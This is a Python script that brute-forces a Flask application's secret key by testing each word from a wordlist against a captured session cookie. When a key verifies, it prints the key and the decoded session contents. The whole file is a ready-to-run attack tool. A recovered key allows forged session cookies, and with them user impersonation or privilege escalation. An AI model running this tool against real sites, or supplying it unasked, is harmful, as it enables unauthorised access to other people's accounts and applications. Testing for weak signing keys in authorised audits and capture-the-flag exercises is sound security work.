from flask.sessions import SecureCookieSessionInterface
from itsdangerous import BadSignature
import argparse

class MockApp:
    secret_key = None

def decode_flask_cookie(secret_key, cookie_value):
    app = MockApp()
    app.secret_key = secret_key

    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    if not session_serializer:
        return None

    try:
        data = session_serializer.loads(cookie_value)
        return data
    except BadSignature:
        return None
    except Exception as e:
        print(f"[!] Error with key '{secret_key}': {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description='Brute-force Flask secret key.')
    parser.add_argument('-c', '--cookie', required=True, help='Flask session cookie')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist')
    args = parser.parse_args()

    with open(args.wordlist, 'r') as f:
        keys = [line.strip() for line in f]

    print(f"[*] Trying {len(keys)} keys...")

    for key in keys:
        result = decode_flask_cookie(key, args.cookie)
        if result is not None:
            print(f"[+] Found key: '{key}'")
            print(f"[+] Decoded session: {result}")
            return

    print("[-] Secret key not found in wordlist.")

if __name__ == '__main__':
    main()
